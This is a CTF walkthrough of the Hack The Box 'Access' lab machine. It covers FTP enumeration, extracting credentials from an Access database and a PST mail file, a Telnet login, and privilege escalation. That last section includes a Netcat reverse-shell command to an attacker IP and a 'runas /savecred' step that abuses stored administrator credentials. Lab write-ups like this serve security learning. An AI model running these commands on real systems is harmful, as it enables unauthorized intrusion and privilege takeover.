---
title: "Access Walkthrough(Hack The Box)"
date: 2025-04-01
draft: false
description: "A brief walkthrough of Access box from Hack the box"
tags: ["Easy", "Windows", "Hack The Box", "Hacking", "Active Directory", "Walkthrough"]
 
---
## Reconnaissance
- On the initial Nmap scan I can see interesting ports open which are FTP, Telnet and a http port(80) 
![Pasted image 20241216220450.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241216220450.png?raw=true)
- Quickly I checked for anonymous login and it seems like it was enabled. Which was interesting.
- While at that I also discovered that home page mentions `LON-MC6` which leads to `MS09-042` a vulnerability in Telnet

{{< badge >}} Definition {{< /badge >}}
This security update resolves a publicly disclosed vulnerability in the Microsoft Telnet service. The vulnerability could allow an attacker to obtain credentials and then use them to log back into affected systems. The attacker would then acquire user rights on a system identical to the user rights of the logged-on user. This scenario could ultimately result in remote code execution on affected systems. An attacker who successfully exploited this vulnerability could install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

- Anyway when I try to login FTP, and it worked but after that I can't access any directories it's simply giving timeouts. Which was frustrating
![frustrating](https://media.giphy.com/media/3oEhmI2ggePqhmHoE8/giphy.gif?cid=790b76110k8nd7mxkyobs68ecd2qo6ct0xsok5yl1zy1q2li&ep=v1_gifs_search&rid=giphy.gif&ct=giving)
- After multiple tries atlast I was able to access the files in FTP.

## Enumeration

### Analyzing `backup.mdb`
- While enumerating the directories I found two files interesting one was an db file - `backup.mdb` 
```
> file backup.mdb 
backup.mdb: Microsoft Access Database
```
- To see the contents of the database I installed a tool `sudo apt install mdbtools`
- I can list all the tables using this coomand
```bash
mdb-tables backup.mdb
```
- To get the data from a table I could use this command
```bash
mdb-export backup.mdb <table-name>
```
- From `auth_user` table I got a username and password
```
> mdb-export backup.mdb auth_user
<SNIP>
27,"engineer","access4u@security",1,"02/24/18 1:54:36",26,
<SNIP>
```
![one-down](https://media1.tenor.com/m/VaUHmQW1SNEAAAAd/one-down-saanvi-bahl.gif)

## Exploitation

### Analyzing `Access Control.zip`
- The other file was a compressed zip file - `Access Control.zip`.
- I used this password `access4u@security` for the zip file and extracted it's contents
```bash
7z x Access Control.zip
```
- It had only one file called `Access Control.pst`. I can see that this is a outlook mail file.
- So I used a online `PST` opener and read it's contents
- To keep it simple, It had password for another account. The message reads...
```
Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.                                                                                          

Regards,

John
```
- This username `security` and the password `4Cc3ssC0ntr0ller` works for telnet. So I logged in as user `security`
- Then I got the {{< keyword >}} User flag {{< /keyword >}}
![Pasted image 20241216231714.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241216231714.png?raw=true)

## Privilege Escalation
- Using `cmdkey /list` will show the available and stored creds.
- We can use `runas` for running as something if appropriate constraints are valid. For an example `runas` is similar to `sudo` for windows if not the same.
- Here in this case we got saved creds so first lets transfer `nc.exe` to the target machine
- Then I used this command to save it to a bat file
```bash
echo c:\users\security\nc.exe -e cmd.exe 10.10.14.12 6001 > shell.bat
```
- And execute it with `runas` command with saved creds for the user `administrator`
```bash
runas /user:administrator /savecred c:\users\security\shell.bat
```
- This above command will use the saved password for the user `Administrator` and run the malicious `bat` file as `Administrator`
- I got access as administrator in my shell
- I got {{< keyword >}} Root access {{< /keyword >}}
![Pasted image 20241216233210.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241216233210.png?raw=true)

## Summary
The Access machine from Hack The Box was an easy Windows-based challenge involving FTP access, database extraction, and privilege escalation. Initial enumeration revealed open FTP, Telnet, and HTTP ports, with anonymous FTP login enabled. A Microsoft Access database (backup.mdb) contained credentials, which unlocked a protected ZIP file leading to an Outlook PST file with another set of credentials. Using Telnet, I logged in as security and retrieved the user flag. Privilege escalation was achieved by leveraging stored credentials with cmdkey and runas, executing a Netcat reverse shell to gain administrator access and retrieve the root flag. The box was straightforward but engaging, with a mix of credential discovery and privilege escalation.

{{< typeit >}} This was a good and easy machine and thus short but bomb!, Next walkthrough would be Sightless so be sure to check it out. Bye!. {{< /typeit >}}
![bye](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExOGpxY2VveXNsY3N5cmd0cDhydXNva3I4b3RkMW4yN3ZlanV6MWxxcSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/1Q6K09gcxYWcUxxraT/giphy.gif)
